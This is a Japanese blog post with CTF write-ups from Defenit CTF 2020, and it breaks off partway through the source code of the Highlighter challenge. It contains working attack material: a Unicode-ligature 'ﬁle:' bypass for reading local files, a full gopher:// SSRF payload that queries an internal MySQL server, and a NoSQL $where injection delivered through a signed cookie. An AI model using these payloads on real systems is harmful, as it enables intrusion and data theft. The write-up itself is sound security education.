---
layout: post
title: Defenit CTF 2020 の write-up
categories: [ctf]
date: 2020-06-08 17:00:00 +0900
---

6 月 5 日から 6 月 7 日にかけて開催された [Defenit CTF 2020](https://ctf.defenit.kr/) に、チーム zer0pts として参加しました。最終的にチームで 12098 点を獲得し、順位は 100 点以上得点した 427 チーム中 4 位でした。うち、私は 6 問を解いて 3346 点を入れました。

他のメンバーの write-up はこちら。

- [Defenit CTF 2020 writeup - ふるつき](https://furutsuki.hatenablog.com/entry/2020/06/07/192729)
- [Defenit CTF 2020 Writeups - CTFするぞ](https://ptr-yudai.hatenablog.com/entry/2020/06/07/202053)

以下、私が解いた問題の write-up です。

## [Forensic 198] Baby Steganography (69 solves)
> I heared you can find hide data in Audio Sub Bit.  
> Do you want to look for it?
> 
> Author: @ws1004
> 
> 添付ファイル: baby-steganography.zip

与えられた ZIP ファイルを展開すると `problem` という名前の謎のファイルが出てきました。どのようなファイルか `file` コマンドで確認しましょう。

```
$ file problem
problem: RIFF (little-endian) data, WAVE audio, Microsoft PCM, 16 bit, stereo 48000 Hz
```

WAV ファイルのようです。適当なプレイヤーで再生してみましたが、怪しげな音が聞こえてくるわけではありませんでした。とりあえず、`xxd` でバイナリを見てみましょう。

```
$ xxd problem | head
0000000: 5249 4646 e0f5 b800 5741 5645 666d 7420  RIFF....WAVEfmt
0000010: 1000 0000 0100 0200 80bb 0000 00ee 0200  ................
0000020: 0400 1000 6461 7461 bcf5 b800 0001 0000  ....data........
0000030: 0001 0000 0001 0100 0001 0001 0001 0100  ................
0000040: 0001 0100 0001 0100 0001 0001 0001 0100  ................
0000050: 0101 0100 0001 0100 0100 0001 0001 0101  ................
0000060: 0001 0000 0001 0101 0100 0101 0001 0001  ................
0000070: 0100 0001 0000 0101 0000 0000 0001 0101  ................
0000080: 0001 0001 0001 0001 0101 0101 0001 0100  ................
0000090: 0100 0101 0001 0100 0101 0100 0001 0000  ................
```

`data` チャンクの最初の方で `00` と `01` ばかりが出現しています。ちょっと怪しい。

この CTF のフラグのフォーマットである `Defenit{` を 2 進数に変換すると `01000100 01100101 01100110 01100101 01101110 01101001 01110100 01111011` になります。上記のダンプでいう 0x2c あたりから `00 01 00 00 00 01 00 00` (`D`)、`00 01 01 00 00 01 00 01` (`e`) … というバイト列が続いており、これをデコードするとフラグが出てきそうな雰囲気があります。スクリプトを書きましょう。

```python
import sys

with open('problem', 'rb') as f:
  f.read(0x2c)
  flag = ''

  while True:
    c = ''

    for _ in range(8):
      b = f.read(1)
      if b == b'\x00':
        c += '0'
      elif b == b'\x01':
        c += '1'
      else:
        sys.exit(0)

    flag += chr(int(c, 2))
    print(flag)

    if flag.endswith('}'):
      break
```

```
$ python solve.py
︙
Defenit{Y0u_knOw_tH3_@uD10_5t39@No9rAphy?!}
```

フラグが得られました。

```
Defenit{Y0u_knOw_tH3_@uD10_5t39@No9rAphy?!}
```

## [OSINT 726] Hack the C2 (7 solves)
> Some hacker make ransomware, and he is going to spread it.  
> We should stop him, but the only we have is that  
> the hacker uses nickname 'b4d_ar4n9'.
> 
> Find hacker's info and stop him!
> 
> Author: @arang

### OSINT パート
`b4d_ar4n9` というハッカーのニックネームだけが与えられています。Google ほか適当な検索エンジンで検索してみましたが、有用な情報は見つかりません。では SNS のアカウントではどうだろうかと `b4d_ar4n9` というユーザ名を持つアカウントを様々な SNS で探してみたところ、Twitter で [@b4d_ar4n9](https://twitter.com/b4d_ar4n9) が見つかりました。

プロフィールによればこの人はめっちゃ強いランサムウェアを作ったらしいので、その情報を得るべくツイートを見てみましたが、

<blockquote class="twitter-tweet"><p lang="en" dir="ltr">OK. I decided my ransomware&#39;s name.</p>&mdash; b4d_aR4n9 (@b4d_aR4n9) <a href="https://twitter.com/b4d_aR4n9/status/1263074083178049538?ref_src=twsrc%5Etfw">May 20, 2020</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

<blockquote class="twitter-tweet"><p lang="en" dir="ltr">I deleted my ransomware&#39;s name.. so don&#39;t follow me!!!</p>&mdash; b4d_aR4n9 (@b4d_aR4n9) <a href="https://twitter.com/b4d_aR4n9/status/1267107804365512708?ref_src=twsrc%5Etfw">May 31, 2020</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

なるほど、一度ランサムウェアの名前を決めてツイートしたものの消してしまったようです。どこかに魚拓が残っていないでしょうか。

Internet Archive の [Wayback Machine](https://archive.org/web/) に投げてみると、現在は削除されてしまったツイートを見ることができました。

> SUPER_POWERFUL_RANSOMWARE     !!  
> literally, I will make super powerful ransomware!!!
> 
> [https://web.archive.org/web/20200520115408/https://twitter.com/b4d_aR4n9](https://web.archive.org/web/20200520115408/https://twitter.com/b4d_aR4n9)

なるほど、`SUPER_POWERFUL_RANSOMWARE` がそのランサムウェアの名前のようです。この名前を検索エンジンや SNS で調べてみたところ、GitHub で [Ba6-4raNg/myfirstapp](https://github.com/Ba6-4raNg/myfirstapp) というリポジトリが見つかりました。`README.md` に名前が入っていたのでヒットしたようです。

ユーザ名も [`Ba6-4raNg`](https://github.com/Ba6-4raNg) と `b4d_ar4n9` によく似ていますから、おそらくこの問題に関連するアカウントでしょう。消されたり非公開になったリポジトリがないかまた Wayback Machine に[投げてみる](https://web.archive.org/web/*/https://github.com/Ba6-4raNg)と、`SUPER_POWERFUL_RANSOMWARE` というまさに今調べている名前のリポジトリが見つかりました。現在は見られない状態になっていますから、Wayback Machine でこのリポジトリについて引き続き調べます。

リポジトリの説明文に、何らかのサービスへのリンクが書かれていました。このリポジトリのファイル構成は `static` や `templates` など Flask っぽい雰囲気があるので、おそらくそのサービスのソースコードがこのリポジトリの正体なのでしょう。

`Hack the C2` という問題名ですから、ソースコードを参考にしながらそのサービスを攻撃しましょう。

### Web パート
#### ソースコードの解析

メインのソースコード (`main.py`) は以下のような内容でした。

```python
#-*- coding: utf-8 -*-
from flask import Flask, render_template, request
from io import BytesIO
import subprocess
import pycurl
import re
from urllib import parse

app = Flask(__name__)

@app.route('/')
def index():
	return render_template('index.html')

# health check! - ps
@app.route('/he41th_ch3ck_C2_ps')
def health_ps():
	r = subprocess.Popen("ps -ef".split(' '),stdout=subprocess.PIPE).stdout.read().decode().split('\n')
	result = []
	for i in r:
		if 'python' in i:
			result.append(i)
	
	return render_template('he41th_ch3ck_C2_ps.html', results=result)

# health check! - netstat
@app.route('/h3alTh_CHeCK_c2_nEtsTaT')
def health_netstat():
	r = subprocess.Popen("netstat -lntp".split(' '),stdout=subprocess.PIPE).stdout.read().decode().split('\n')
	return render_template('h3alTh_CHeCK_c2_nEtsTaT.html', results=r)

# health check! - curl
@app.route('/He4ltH_chEck_c2_cur1')
def health_curl():
	url = request.args.get('url')
	try:
		if url:
			turl = filterUrl(url)
			if turl:
				url = turl
				try:
					buffer = BytesIO()
					c = pycurl.Curl()
					c.setopt(c.URL,url)
					c.setopt(c.SSL_VERIFYPEER, False)
					c.setopt(c.WRITEDATA,buffer)
					c.perform()
					c.close()
					try:
						result = buffer.getvalue().decode().split('\n')
					except:
						result = buffer.getvalue()
				except Exception as e:
					print('[x] curl err - {}'.format(str(e)))
					result = ['err.....']
				return render_template('He4ltH_chEck_c2_cur1.html', results=result)
			else:
				return render_template('He4ltH_chEck_c2_cur1.html', results=['nah.. url is error or unsafe!'])
	except Exception as e:
		print('[x] curl err2... - {}'.format(str(e)))
	return render_template('He4ltH_chEck_c2_cur1.html', results=['nah.. you didn\'t give url'])

def filterUrl(url):
	try:
		# you may not read any file
		if re.compile(r"(^[^:]{3}:)").search(url):
			if re.compile(r"(^[^:]{3}:/[^(.|/)]/[^(.|/)]/)").search(url):
				print('[+] curl url - {}'.format(url.replace("..","").encode('idna').decode().replace("..","")))
				return url.replace("..","").encode('idna').decode().replace("..","")
		elif re.compile(r"(^[^:]{4}://(localhost|172\.22\.0\.\d{1,3})((:\d{1,5})/|/))").search(url):
			p = parse.urlparse(url)
			if (p.scheme == 'http'):
				print('[+] curl url - {}'.format(url))
				return url
		elif re.compile(r"(^[^:]{6}://(localhost|172\.22\.0\.\d{1,3})((:\d{1,5})/|/))").search(url):
			print('[+] curl url - {}'.format(url))
			return url
	except Exception as e:
		print('[x] regex err - {}'.format(str(e)))
		return False

	return False


if __name__ == "__main__":
    try:
        app.run(host='0.0.0.0', port=9090)
    except Exception as ex:
        print(ex)
```

以下のような機能があるようです。

- `/he41th_ch3ck_C2_ps`: `ps -ef` で実行中のプロセスを得た結果のうち、`python` を含むものだけを出力してくれる
- `/h3alTh_CHeCK_c2_nEtsTaT`: `netstat -lntp` でポートの状態を確認して出力してくれる
- `/He4ltH_chEck_c2_cur1`: GET パラメータで与えた URL に `curl` でアクアセスしてくれる、ただし `filterUrl` でチェックされる

`/he41th_ch3ck_C2_ps` にアクセスしてみましょう。

```
root 7 1 99 Jun06 pts/0 3-20:24:04 python3 /app/app/main.py
root 10 1 0 Jun06 pts/0 00:01:16 python3 /app2/app/main.py
```

この他になにかサービスを動かしているのでしょうか🤔

`/h3alTh_CHeCK_c2_nEtsTaT` にアクセスしてみましょう。

```
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name
tcp 0 0 0.0.0.0:7777 0.0.0.0:* LISTEN 10/python3
tcp 0 0 0.0.0.0:9090 0.0.0.0:* LISTEN 7/python3
tcp 0 0 127.0.0.11:37159 0.0.0.0:* LISTEN -
```

このサービスで使われているのは 9090 番ポートですが、7777 番ポートも使われているようです。が、アクセスすることはできませんでした。外部からは接続できないようです。

あとは `/He4ltH_chEck_c2_cur1` だけですが、入力された URL のフィルターに使われている `filterUrl` を見ていきましょう。

```python
		if re.compile(r"(^[^:]{3}:)").search(url):
			if re.compile(r"(^[^:]{3}:/[^(.|/)]/[^(.|/)]/)").search(url):
				print('[+] curl url - {}'.format(url.replace("..","").encode('idna').decode().replace("..","")))
				return url.replace("..","").encode('idna').decode().replace("..","")
```

プロトコル名が 3 文字の場合のチェックのようです。`ftp:/a/b/poyo` のような URL であれば OK なようです。

スラッシュに挟まれている `a` と `b` の部分はいずれも 1 文字でなければならず、かつ `/` `.` のような文字は使ってはいけないようです。なぜでしょうか。

```python
		elif re.compile(r"(^[^:]{4}://(localhost|172\.22\.0\.\d{1,3})((:\d{1,5})/|/))").search(url):
			p = parse.urlparse(url)
			if (p.scheme == 'http'):
				print('[+] curl url - {}'.format(url))
				return url
```

プロトコル名が 4 文字の場合のチェックのようです。ホスト部分が `localhost` か `172.22.0.(1 ~ 3 ケタの数字)` で、その後に任意でポート番号、そしてスラッシュが続けば OK なようです。また、その後 `parse.urlparse(url)` で URL をパースし、プロトコルが HTTP のものでなければならないようです。

おそらく、`file:///etc/passwd` のように `file` スキームを使ってローカルのファイルを読み込まれることを想定して、これを防いでいるのでしょう。

まず思いつくのは `parse.urlparse` と `curl` の[パーサの挙動の差異を利用したバイパス](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)ですが、ここでチェックされているのはプロトコル部分ですから難しいように思えます。

```python
		elif re.compile(r"(^[^:]{6}://(localhost|172\.22\.0\.\d{1,3})((:\d{1,5})/|/))").search(url):
			print('[+] curl url - {}'.format(url))
			return url
```

プロトコル名が 6 文字の場合のチェックのようです。こちらもホスト部分とポート番号などのチェックが行われているようですが、プロトコル名のチェックは行われておらず、ゆるいものに見えます。

[`curl` のドキュメント](https://curl.haxx.se/libcurl/c/CURLOPT_PROTOCOLS.html)を見ると、6 文字のプロトコルには `gopher` `rtmpte` `rtmpts` `telnet` があることがわかります。`gopher` は [SSRF に便利なことで有名](https://speakerdeck.com/hasegawayosuke/ssrfji-chu)で、例えば `curl gopher://example.com:80/_GET%20/%20HTTP/1.1%0d%0aHost:%20example.com%0d%0a%0d%0a` を実行すると以下のような HTTP リクエストが `example.com:80` に飛んでいきます。

```
GET / HTTP/1.1
Host: example.com
```

(この例では HTTP ですが…) HTTP に限らず SSRF ができるという点で便利です。

#### SSRF
気になっていた 7777 番ポートのサービスについて確認しましょう。`He4ltH_chEck_c2_cur1` を使えばアクセスできるでしょうか。

`/He4ltH_chEck_c2_cur1?url=http://localhost:7777/` にアクセスすると以下のような HTML が返ってきました。

```html
︙
<title> [INTERNAL] SUPER SAFE C2 SERVER :-p </title>
︙
```

なるほど、外部からアクセスできるサービスとは別のもののようです。`http://localhost:7777/he41th_ch3ck_C2_ps` などを試してみましたが、`ps` `netstat` `curl` を呼び出すパスはいずれもアクセスすると 404 を返し、使えないようでした。

全く異なるサービスというのはよいのですが、Wayback Machine で閲覧できた GitHub のリポジトリにはソースコードはありませんでした。なにか意味はあるはずですから、なんとかして手に入れられないでしょうか。

考えられるのは `/He4ltH_chEck_c2_cur1` で `file` スキームを使って `curl` に `netstat` から得られたパスである `/app2/app/main.py` を読み込ませる方法です。ただ、`filterUrl` はプロトコル名が 4 文字のときには HTTP しか許されないですから、どうしようもないように思えます。

ここで悩んでいたところ、チームメンバーの aventador さんが `ﬁle:/／/./etc/passwd` のように ASCII 外の文字を使えばフィルターをバイパスできるのでは、というアイデアを出されました。`ﬁ` は合字の 1 文字ですから `[^:]{3}` は `ﬁle` にマッチします。また、`url.replace("..","").encode('idna')` によって以下のように `ﬁle` は `file` に変換されます。

```
$ python
>>> 'ﬁ'.encode('idna').decode()
'fi'
```

これを利用して、`/He4ltH_chEck_c2_cur1?url=ﬁle:/／/／/app2/app/main.py` で以下のようにソースコードが得られました。

```python
#-*- coding: utf-8 -*-
from flask import Flask, render_template, request
import pymysql
import os
import subprocess

app = Flask(__name__)

def connect_db():
	db = pymysql.connect(
		user='b4d_aR4n9',
		#passwd=os.environ['DBPW'],
		host='172.22.0.4',
                port=3306,
		db='defenit_ctf_2020',
		charset='utf8' 
	)

	return db

db = connect_db()

@app.route('/')
def index():
	try:
		if request.remote_addr != '172.22.0.3' and request.remote_addr != '127.0.0.1':
			return '[INTERNAL] localhost only..'
		return render_template('index.html')
	except: 
		return '[x] errr.....'

# if input killcode, kill all ransomware
@app.route('/k1ll_r4ns0mw4r3')
def kill_ransom():
	try:
		if request.remote_addr != '172.22.0.3' and request.remote_addr != '127.0.0.1': 
			return '[INTERNAL] localhost only..'

		cursor = db.cursor(pymysql.cursors.DictCursor)
		cursor.execute("SELECT ki11c0d3 from secret;")

		if cursor.fetchall()[0]['ki11c0d3'] == request.args.get('ki11c0d3'):
			return subprocess.Popen("/app2/getFlag", stdout=subprocess.PIPE).stdout.read().strip()
		else:
			return '[x] you put wrong killcode!'
	except:
		return '[x] errr.....'
if __name__=="__main__":
	app.run(host='0.0.0.0', port=7777)
```

`172.22.0.4:3306` で MySQL のサービスが動いているようで、ここで `SELECT ki11c0d3 from secret;` した結果と GET パラメータで与えた値が一致していればフラグが得られるようです。

SQLi できるような箇所はありませんが、接続時に使われる
接続先とユーザ名はわかっており、パスワード認証もされていないことがわかります。`gopher` プロトコルを用いた SSRF で `SELECT ki11c0d3 from secret;` の内容が得られないでしょうか。

SSRF するときに便利なツールのひとつに [tarunkant/Gopherus](https://github.com/tarunkant/Gopherus) があります。これを使えば、ユーザ名や実行する SQL を入力するだけで MySQL サーバに接続して SQL を実行してくれるような `gopher` プロトコルの URL を出力してくれます。やってみましょう。

```
$ gopherus --exploit mysql


  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

                author: $_SpyD3r_$

For making it work username should not be password protected!!!

Give MySQL username: b4d_aR4n9
Give query to execute: SELECT ki11c0d3 from defenit_ctf_2020.secret;

Your gopher link is ready to do SSRF : 

gopher://127.0.0.1:3306/_%a8%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%62%34%64%5f%61%52%34%6e%39%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%3e%00%00%00%03%53%45%4c%45%43%54%20%63%6f%6e%63%61%74%28%27%5b%27%2c%6b%69%31%31%63%30%64%33%2c%27%5d%27%29%20%66%72%6f%6d%20%64%65%66%65%6e%69%74%5f%63%74%66%5f%32%30%32%30%2e%73%65%63%72%65%74%3b%01%00%00%00%01

-----------Made-by-SpyD3r-----------
```

接続先の IP アドレスである `127.0.0.1` を `172.22.0.4` に変え、また URL が GET パラメータから与えられることを考慮してパーセントエンコーディングをします。`/He4ltH_chEck_c2_cur1?url=gopher://172.22.0.4:3306/_%25a8%2500%2500%2501%2585…` にアクセスすると以下のようなレスポンスが返ってきました。

```
74
0
0
0
10
53
46
55
46
51
︙
```

数値で返ってきてしまいました。ブラウザの DevTools の Console で雑に文字列に直してくれるスクリプトを実行します。

```
>document.body.innerHTML.match(/\d+/g).map(c => parseInt(c, 10)).filter(x => 0x20 <= x && x < 0x7f).map(c => String.fromCharCode(c)).join('').replace(/!/g, '')
<"J5.7.30#CYMCq%-"r%E`*VbVmysql_native_passwordBdefdefenit_ctf_2020secretsecretki11c0d3ki11c0d3P#"k1ll_th3_ALL_b4d_aR4n9_ransomeware"
```

`/He4ltH_chEck_c2_cur1?url=http://localhost:7777/k1ll_r4ns0mw4r3?ki11c0d3=k1ll_th3_ALL_b4d_aR4n9_ransomeware` にアクセスするとフラグが得られました。

```
Defenit{y0u_pr0t3ct3d_the_w0r1d_by_h@cK_th3_C2!!}
```

## [Web 507] Fortune Cookie (15 solves)
> Here's a test of luck!  
> What's your fortune today?
> 
> Author: @posix
> 
> 添付ファイル: fortune-cookie.tar.gz

`fortune-cookie.tar.gz` を展開すると、以下のようなソースコードが出てきました。

```javascript
const express = require('express');
const cookieParser = require('cookie-parser');
const { MongoClient, ObjectID } = require('mongodb');
const { FLAG, MONGO_URL } = require('./config');

const app = express();

app.set('view engine', 'html');
app.engine('html', require('ejs').renderFile);

app.use(cookieParser('🐈' + '🐇'));
app.use(express.urlencoded());


app.get('/', (req, res) => {
    res.render('index', { session: req.signedCookies.user });
});

app.get('/login', (req, res) => {
    res.render('login');
});

app.post('/login', (req, res) => {
    let { username } = req.body;

    res.cookie('user', username, { signed: true });
    res.redirect('/');
});

app.use((req, res, next) => {
    if (!req.signedCookies.user) {
        res.redirect('/login');
    } else {
        next();
    }
});

app.get('/logout', (req, res) => {
    res.clearCookie('user');
    res.redirect('/');
});

app.get('/write', (req, res) => {
    res.render('write');
});

app.post('/write', (req, res) => {

    const client = new MongoClient(MONGO_URL, { useNewUrlParser: true });
    const author = req.signedCookies.user;

    const { content } = req.body;

    client.connect(function (err) {

        if (err) throw err;

        const db = client.db('fortuneCookie');
        const collection = db.collection('posts');

        collection
            .insertOne({
                author,
                content
            })
            .then((result) => {
                res.redirect(`/view?id=${result.ops[0]._id}`)
            }
            );

        client.close();

    });

});

app.get('/view', (req, res) => {

    const client = new MongoClient(MONGO_URL, { useNewUrlParser: true });
    const author = req.signedCookies.user;
    const { id } = req.query;

    client.connect(function (err) {

        if (err) throw err;

        const db = client.db('fortuneCookie');
        const collection = db.collection('posts');

        try {
            collection
                .findOne({
                    _id: ObjectID(id)
                })
                .then((result) => {

                    if (result && typeof result.content === 'string' && author === result.author) res.render('view', { content: result.content })
                    else res.end('Invalid or not allowed');

                }
                );
        } catch (e) { res.end('Invalid request') } finally {
            client.close();
        }


    });
});

app.get('/posts', (req, res) => {

    let client = new MongoClient(MONGO_URL, { useNewUrlParser: true });
    let author = req.signedCookies.user;

    if (typeof author === 'string') {
        author = { author };
    }

    client.connect(function (err) {

        if (err) throw err;

        const db = client.db('fortuneCookie');
        const collection = db.collection('posts');

        collection
            .find(author)
            .toArray()
            .then((posts) => {
                res.render('posts', { posts })
            }
            );

        client.close();

    });

});

app.get('/flag', (req, res) => {

    let { favoriteNumber } = req.query;
    favoriteNumber = ~~favoriteNumber;

    if (!favoriteNumber) {
        res.send('Please Input your <a href="?favoriteNumber=1337">favorite number</a> 😊');
    } else {

        const client = new MongoClient(MONGO_URL, { useNewUrlParser: true });

        client.connect(function (err) {

            if (err) throw err;

            const db = client.db('fortuneCookie');
            const collection = db.collection('posts');

            collection.findOne({ $where: `Math.floor(Math.random() * 0xdeaaaadbeef) === ${favoriteNumber}` })
                .then(result => {
                    if (favoriteNumber > 0x1337 && result) res.end(FLAG);
                    else res.end('Number not matches. Next chance, please!')
                });

            client.close();

        });
    }
})

app.listen(8080, '0.0.0.0');
```

フラグの場所を確認しましょう。

```javascript
app.get('/flag', (req, res) => {

    let { favoriteNumber } = req.query;
    favoriteNumber = ~~favoriteNumber;

    if (!favoriteNumber) {
        res.send('Please Input your <a href="?favoriteNumber=1337">favorite number</a> 😊');
    } else {

        const client = new MongoClient(MONGO_URL, { useNewUrlParser: true });

        client.connect(function (err) {

            if (err) throw err;

            const db = client.db('fortuneCookie');
            const collection = db.collection('posts');

            collection.findOne({ $where: `Math.floor(Math.random() * 0xdeaaaadbeef) === ${favoriteNumber}` })
                .then(result => {
                    if (favoriteNumber > 0x1337 && result) res.end(FLAG);
                    else res.end('Number not matches. Next chance, please!')
                });

            client.close();

        });
    }
})
```

`/flag` で `0x1337` より大きな数値を与えて `Math.floor(Math.random() * 0xdeaaaadbeef)` を当てることができればフラグが得られるようです。どう考えても無理でしょう。

ですが、もし `Math.floor` を書き換えて返り値を操作することができたらどうでしょうか。事前に `31337` を返すような関数に置き換えることができれば、`/flag?favoriteNumber=31337` にアクセスするだけでフラグが得られます。

よく似たようなことができた問題として、[HITCON CTF 2019 Quals](2019-10-14-hitcon-ctf-2019.html) で出題された [Luatic](2019-10-14-hitcon-ctf-2019.html#luatic-230) があります。今回は MongoDB で Luatic は Redis であるという違いがありますが、Luatic では Redis 上で Lua の `math.random` を呼び出し、この返り値を当てることができればフラグが得られたという点でよく似ています。Luatic では `function math.random() return 123 end` を実行させると `math.random` を恒久的に置き換えることができるという挙動を利用して解くことができました。

今回は MongoDB ですが、どこかで `Math.floor` を書き換えることができないでしょうか。例えば、どこかで NoSQL Injection ができるとして、`collection.find` の引数に `{'$where': 'Math.floor = function () { return 1 }; return Math.floor(0)'}` を与えるのはどうでしょう。

このようなことが実行可能かどうか、MongoDB を手元で立ち上げて試してみましょう。

```
$ mongo
︙
> db.posts.findOne({'$where': 'Math.floor = function () { return 1 }; return Math.floor(0)'})
{
        "_id" : ObjectId("5eda18529ad2bedc0477fbd0"),
        "author" : "test",
        "content" : "poyo"
}
> db.posts.findOne({'$where': 'return Math.floor(0)'})
{
        "_id" : ObjectId("5eda18529ad2bedc0477fbd0"),
        "author" : "test",
        "content" : "poyo"
}
> db.posts.findOne({'$where': 'return Math.floor(0)'})
{
        "_id" : ObjectId("5eda18529ad2bedc0477fbd0"),
        "author" : "test",
        "content" : "poyo"
}
> db.posts.findOne({'$where': 'return Math.floor(0)'})
null
```

これで確かに `Math.floor` を書き換えることができましたが、しばらく経つと本来の `Math.floor` に戻ってしまうようです。書き換え後は急いで `/flag` にアクセスしないとダメそうですね。

NoSQL Injection が可能な箇所を探しましょう。`find` や `findOne` が呼ばれている箇所を探すと、`/posts` で `find` にユーザ入力を渡しているのが確認できました。

```javascript
app.get('/posts', (req, res) => {

    let client = new MongoClient(MONGO_URL, { useNewUrlParser: true });
    let author = req.signedCookies.user;

    if (typeof author === 'string') {
        author = { author };
    }

    client.connect(function (err) {

        if (err) throw err;

        const db = client.db('fortuneCookie');
        const collection = db.collection('posts');

        collection
            .find(author)
            .toArray()
            .then((posts) => {
                res.render('posts', { posts })
            }
            );

        client.close();

    });

});
```

ただし、ユーザ入力といっても `req.signedCookies.user` と署名された Cookie 由来のものです。どこかでこれを操作している箇所がないか探してみると、`/login` が見つかりました。

```javascript
app.post('/login', (req, res) => {
    let { username } = req.body;

    res.cookie('user', username, { signed: true });
    res.redirect('/');
});
```

HTTP リクエストボディとして与えたパラメータがそのまま `user` にセットされています。`typeof username` などで文字列かどうか確認されていたりはしないようですから、HTTP リクエストボディを `user[$where]=hoge` のようにすれば `user` を `{'$where': 'hoge'}` というオブジェクトにできるはずです。

`hoge` のかわりに `Math.floor = function () { return 0x6e656b6f }; return 0` でログインします。発行された Cookie を確認すると `s%3Aj%3A%7B%22%24where%22%3A%22Math.floor%20%3D%20function%20()%20%7B%20return%200x6e656b6f%20%7D%3B%20return%200%22%7D.JeXDhkvRNbTkmsD%2BzayIN730mOr6HI%2Fy9Jv8JJNmA1Y` (`s:j:{"$where":"Math.floor = function () { return 0x6e656b6f }; return 0"}.JeXDhkvRNbTkmsD+zayIN730mOr6HI/y9Jv8JJNmA1Y`) と、確かに `user` が文字列ではなくオブジェクトになっていることがわかります。

`/posts` にアクセスして `find` を実行させてから `/flag?favoriteNumber=0x6e656b6f` にアクセスするとフラグが得られました。

```
Defenit{c0n9r47ula7i0n5_0n_y0u2_9o0d_f02tun3_haHa}
```

## [Web 857] Highlighter (4 solves)
> Do you like the Chrome extension?  
> I made a tool to highlight a string through this.  
> Use it well! :)
> 
> Author: @posix
> 
> 添付ファイル: highlighter.zip, SuperHighlighter.crx

`highlighter.zip` を展開すると、`app.js` や `docker-compose.yml` など問題サーバのソースコードが出てきました。

`docker-compose.yml` は以下のような内容でした。

```
version: '3.5'
services:
  db:
    build: ./docker/mysql
    container_name: highlighter-db
    environment: 
      MYSQL_ROOT_PASSWORD: highlighter
      MYSQL_USER: highlighter
      MYSQL_PASSWORD: highlighter
      MYSQL_DATABASE: highlighter
    volumes: 
      - ./conf/mysql:/docker-entrypoint-initdb.d
    networks:
      highlighter-backend:
        ipv4_address: 172.23.0.2
  node:
    build: ./docker/node
    container_name: highlighter-js
    environment: 
      NODE_ENV: 'development'
    volumes: 
      - ./data/node:/app
      - ./flag:/redacted/flag
    links:
      - "db:db"
      - "selenium:selenium"
    networks:
      highlighter-backend:
        ipv4_address: 172.23.0.5
  selenium:
    build: ./docker/selenium
    container_name: highlighter-selenium
    environment:
      GRID_TIMEOUT: 10
    volumes:
      - /dev/shm:/dev/shm
      - ./flag:/redacted/flag
    networks:
      highlighter-backend:
        ipv4_address: 172.23.0.4
networks:
  highlighter-backend:
    driver: bridge
    ipam:
      config:
      - subnet: 172.23.0.0/24
```

`volumes` を見ると、フラグは `node` と `selenium` というコンテナに置かれていることがわかります。ただし、`/redacted/flag` とフラグが置かれているパスは省略されており、なんらかの方法で得る必要がありそうです。

`node` コンテナで動いている `app.js` は以下のような内容でした。

```javascript
const express = require('express');
const cookieParser = require('cookie-parser');
const jwt = require('jsonwebtoken');
const mysql = require('mysql');
const path = require('path');
const crypto = require('crypto');
const webdriver = require("selenium-webdriver");
const chrome = require("selenium-webdriver/chrome");

const encodeExt = file => {
    const stream = require('fs').readFileSync(path.resolve(file));
    return Buffer.from(stream).toString('base64');
};

const options = new chrome.Options();

options.addExtensions(encodeExt('./SuperHighlighter.crx'));

var capabilities = webdriver.Capabilities.chrome();

let driver;

async function reloadDriver() {

    if (driver) {
        driver.quit();
    }

    driver = new webdriver.Builder()
        .usingServer('http://selenium:4444/wd/hub/')
        .withCapabilities(capabilities)
        .setChromeOptions(options)
        .build();

    await driver.get(`http://highlighter.ctf.defenit.kr/`);
    await driver.manage().addCookie({name:'session', value: jwt.sign(JSON.stringify({ id: -1, username: 'this-is-the-super-admin-name' }), config.SECRET)});

}

reloadDriver();

setInterval(() => {
    reloadDriver();
}, 10000);

const config = require('./config');

const app = express();
const conn = mysql.createConnection(config.DB_CONFIG);

app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'html');
app.engine('html', require('ejs').renderFile);

app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());

app.use((req, res, next) => {

    let token = req.cookies['session'];
    req.session = null;

    if (typeof token === 'string' && token.length > 0) {

        try {

            let session = jwt.verify(token, config.SECRET);
            req.session = session;

            next();

        } catch {
            res.clearCookie('session');
            res.redirect('/login');
        }

    } else {

        req.session = null;
        next();

    }

});

app.get('/', (req, res) => {
    res.render('index', { session: req.session });
});

app.get('/login', (req, res) => {
    res.render('login');
});

app.post('/login', (req, res) => {

    let { username, password } = req.body;

    if (typeof username === 'string' && username && typeof password === 'string' && password && username.length <= 16 && username.length >= 5 && password.length < 20 && password.length >= 5) {
        conn.query(
            'select * from users where username = ? and password = ?',
            [username, crypto.createHash('sha256').update(password).digest('hex')],
            (err, result) => {
                if (err) throw err;
                if (result.length === 0) {
                    res.end('Login failed');
                } else {
                    let token = jwt.sign(JSON.stringify({ id: result[0].id, username: result[0].username }), config.SECRET);
                    res.cookie('session', token);
                    res.redirect('/');
                }
            }
        );
    } else {
        res.end('Invalid Input')
    }
})

app.get('/register', (req, res) => {
    res.render('register');
});

app.post('/register', (req, res) => {

    let { username, password } = req.body;

    if (typeof username === 'string' && username && typeof password === 'string' && password && username.length <= 16 && username.length >= 5 && password.length < 20 && password.length >= 5) {

        conn.query(
            'select * from users where username = ?',
            [username],
            (err, result) => {
                if (err) throw err;
                if (result.length === 0) {
                    conn.query(
                        'insert into users values (NULL, ?, ?)',
                        [username, crypto.createHash('sha256').update(password).digest('hex')],
